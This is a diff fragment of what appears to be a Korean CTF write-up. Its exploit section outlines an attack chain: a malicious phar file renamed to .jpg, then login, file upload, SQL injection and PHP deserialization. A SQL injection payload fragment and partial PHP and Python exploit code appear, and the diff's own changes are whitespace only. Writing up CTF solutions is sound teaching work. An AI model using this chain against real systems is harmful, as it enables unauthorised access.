@@ -566,8 +566,9 @@ SET users.filepath=x WHERE users.user=x;#', content='$content' WHERE owner='$own
 ### Exploit Code    
 
 SQL Injection 코드는 @ohk990102 님께서 올려주신 write-up을 참고하여 작성하였습니다.      
-
-1. Create a phar file
+     
+1. Create a phar file      
+      
 ```php
 <?php
 define('DB_HOST', '127.0.0.1');
@@ -668,12 +669,12 @@ $object->close();
 
 // file_exists("phar://./payload.jpg");
 // php --define phar.readonly=0 payload.php 
-?>
-```    
-    
-2. Change the file extension from .phar to .jpg   
+?>  
+```     
+       
+2. Change the file extension from .phar to .jpg     
 
-3. login & file upload & sql injection & php deserialization  
+3. login & file upload & sql injection & php deserialization   
 
 ```python
 import requests
